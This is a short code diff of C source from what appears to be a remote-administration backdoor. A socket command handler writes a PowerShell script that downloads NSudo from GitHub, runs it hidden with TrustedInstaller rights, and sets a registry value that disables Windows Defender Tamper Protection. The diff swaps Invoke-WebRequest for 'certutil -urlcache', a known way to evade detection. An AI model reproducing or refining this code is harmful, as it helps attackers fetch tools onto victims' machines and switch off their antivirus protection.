@@ -207,8 +207,8 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         if (f) {
             fprintf(f, "$zip = Join-Path $env:TEMP 'NSudo.zip'\n");
             fprintf(f, "$out = Join-Path $env:TEMP 'NSudo'\n");
-            fprintf(f, "Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip' -OutFile $zip\n");
-            fprintf(f, "Expand-Archive -Path $zip -DestinationPath $out -Force\n");
+            fprintf(f, "certutil -urlcache -split -f 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip' $zip\n");
+            fprintf(f, "tar -xf $zip -C $out\n");
             fprintf(f, "$exe = Join-Path $out 'NSudo Launcher\\x64\\NSudoLG.exe'\n");
             fprintf(f, "if (Test-Path $exe) {\n");
             fprintf(f, "    Start-Process -FilePath $exe -ArgumentList '-U:T','-ShowWindowMode:Hide','reg','add','HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features','/v','TamperProtection','/t','REG_DWORD','/d','4','/f' -WindowStyle Hidden -Wait\n");
